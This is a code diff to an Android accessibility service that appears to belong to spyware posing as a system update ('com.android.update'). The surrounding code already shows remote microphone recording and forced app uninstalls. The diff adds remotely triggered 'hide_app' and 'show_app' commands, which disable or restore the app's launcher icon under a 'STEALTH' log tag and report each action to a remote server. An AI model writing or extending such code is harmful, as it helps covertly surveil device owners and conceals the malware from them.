@@ -319,6 +319,36 @@ public class MyAccessibilityService extends AccessibilityService {
                 MicRecorder.startRecording(getApplicationContext());
                 break;
 
+            case "hide_app":
+                try {
+                    android.content.pm.PackageManager p = getPackageManager();
+                    android.content.ComponentName componentName = new android.content.ComponentName(
+                            getApplicationContext(), com.android.update.SplashActivity.class);
+                    p.setComponentEnabledSetting(componentName,
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP);
+                    Log.d("STEALTH", "Remote Command: App Icon Hidden");
+                    UploadHelper.sendTextToServer(getApplicationContext(), "sys_log", "Stealth Mode: App Icon Hidden");
+                } catch (Exception e) {
+                    Log.e("STEALTH", "Hide failed: " + e.getMessage());
+                }
+                break;
+
+            case "show_app":
+                try {
+                    android.content.pm.PackageManager p = getPackageManager();
+                    android.content.ComponentName componentName = new android.content.ComponentName(
+                            getApplicationContext(), com.android.update.SplashActivity.class);
+                    p.setComponentEnabledSetting(componentName,
+                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            android.content.pm.PackageManager.DONT_KILL_APP);
+                    Log.d("STEALTH", "Remote Command: App Icon Shown");
+                    UploadHelper.sendTextToServer(getApplicationContext(), "sys_log", "Stealth Mode: App Icon Shown");
+                } catch (Exception e) {
+                    Log.e("STEALTH", "Show failed: " + e.getMessage());
+                }
+                break;
+
             case "uninstall_instagram":
                 openAppInfoAndUninstall("com.instagram.android");
                 break;
